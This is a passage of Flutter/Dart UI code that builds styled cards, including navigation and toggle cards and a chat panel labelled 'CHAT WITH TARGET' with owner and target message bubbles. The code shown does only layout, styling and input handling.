            width: 4,
            height: 18,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_roleColor, _roleColor.withOpacity(0.3)],
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
              ),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 8),
          Text(
            title,
            style: TextStyle(
              color: _textPrimary,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              fontFamily: 'Orbitron',
              letterSpacing: 1,
            ),
          ),
          const Spacer(),
          Container(
            height: 1,
            width: 60,
            color: _borderColor.withOpacity(0.3),
          ),
        ],
      ),
    );
  }

  // ─── 2 CARDS SEJAJAR ──────────────────────────────────────
  Widget _buildTwoCards(List<Widget> cards) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Expanded(child: cards[0]),
          const SizedBox(width: 12),
          Expanded(child: cards[1]),
        ],
      ),
    );
  }

  // ─── NAV CARD (→) ──────────────────────────────────────────
  Widget _buildNavCard(String emoji, String title, String subtitle,
      VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _surfaceColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: _borderColor.withOpacity(0.3)),
          boxShadow: [
            BoxShadow(
              color: _roleColor.withOpacity(0.03),
              blurRadius: 8,
              offset: const Offset(0, 2),
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: _roleColor.withOpacity(0.08),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _roleColor.withOpacity(0.15)),
              ),
              child: Center(
                child: Text(emoji, style: const TextStyle(fontSize: 18)),
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: _textPrimary,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                  Text(
                    subtitle,
                    style: TextStyle(
                      color: _textMuted,
                      fontSize: 10,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
            const Icon(Icons.arrow_forward_ios_rounded,
                color: Color(0xFF707080), size: 14),
          ],
        ),
      ),
    );
  }

  // ─── TOGGLE CARD (ON/OFF) ──────────────────────────────────
  Widget _buildToggleCard(String emoji, String title, bool value,
      Function(bool) onChanged) {
    return GestureDetector(
      onTap: () => onChanged(!value),
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _surfaceColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: value ? _roleColor.withOpacity(0.5) : _borderColor.withOpacity(0.3),
          ),
          boxShadow: value
              ? [
                  BoxShadow(
                    color: _roleColor.withOpacity(0.1),
                    blurRadius: 10,
                    offset: const Offset(0, 2),
                  ),
                ]
              : null,
        ),
        child: Row(
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: value
                    ? _roleColor.withOpacity(0.15)
                    : _roleColor.withOpacity(0.05),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: value
                      ? _roleColor.withOpacity(0.3)
                      : _roleColor.withOpacity(0.1),
                ),
              ),
              child: Center(
                child: Text(emoji, style: const TextStyle(fontSize: 18)),
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: _textPrimary,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                  Text(
                    value ? 'ON ✅' : 'OFF',
                    style: TextStyle(
                      color: value ? AppColors.green : _textMuted,
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
            Container(
              width: 44,
              height: 24,
              decoration: BoxDecoration(
                color: value ? _roleColor : _borderColor.withOpacity(0.3),
                borderRadius: BorderRadius.circular(12),
              ),
              child: AnimatedAlign(
                duration: const Duration(milliseconds: 200),
                alignment: value ? Alignment.centerRight : Alignment.centerLeft,
                child: Container(
                  width: 20,
                  height: 20,
                  margin: const EdgeInsets.all(2),
                  decoration: const BoxDecoration(
                    color: Colors.white,
                    shape: BoxShape.circle,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── CHAT CARD (FULL WIDTH) ────────────────────────────────
  Widget _buildChatCard() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _surfaceColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _borderColor.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(
            color: _roleColor.withOpacity(0.03),
            blurRadius: 8,
            offset: const Offset(0, 2),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                width: 36,
                height: 36,
                decoration: BoxDecoration(
                  color: AppColors.green.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppColors.green.withOpacity(0.3)),
                ),
                child: const Center(
                  child: Text('💬', style: TextStyle(fontSize: 16)),
                ),
              ),
              const SizedBox(width: 10),
              const Expanded(
                child: Text(
                  'CHAT WITH TARGET',
                  style: TextStyle(
                    color: AppColors.textPrimary,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                  ),
                ),
              ),
              const Icon(Icons.arrow_forward_ios_rounded,
                  color: Color(0xFF707080), size: 14),
            ],
          ),
          const SizedBox(height: 10),
          Container(
            height: 120,
            child: _chat.isEmpty
                ? const Center(
                    child: Text(
                      'No messages',
                      style: TextStyle(color: Color(0xFF707080), fontSize: 12),
                    ),
                  )
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.all(4),
                    itemCount: _chat.length,
                    itemBuilder: (_, i) {
                      final m = _chat[i];
                      return Align(
                        alignment: m['from'] == 'owner'
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 3),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 6),
                          decoration: BoxDecoration(
                            color: m['from'] == 'owner'
                                ? AppColors.silver.withOpacity(0.3)
                                : _surface2Color,
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Text(
                            m['text'] ?? '',
                            style: const TextStyle(
                              color: AppColors.textPrimary,
                              fontSize: 12,
                            ),
                          ),
                        ),
                      );
                    },
                  ),
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              Expanded(
                child: Container(
                  decoration: BoxDecoration(
                    color: _surface2Color,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _borderColor.withOpacity(0.3)),
                  ),
                  child: TextField(
                    controller: _chatCtrl,
                    style: const TextStyle(color: AppColors.textPrimary),
                    decoration: const InputDecoration(
                      hintText: 'Type message...',
                      hintStyle: TextStyle(color: Color(0xFF707080), fontSize: 12),
                      border: InputBorder.none,
                      contentPadding: EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                    ),
                    onSubmitted: _sendChat,
                  ),
                ),
              ),
              const SizedBox(width: 8),
              GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_roleColor, _roleColor.withOpacity(0.6)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Icon(Icons.send_rounded,
                      color: Colors.black, size: 18),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}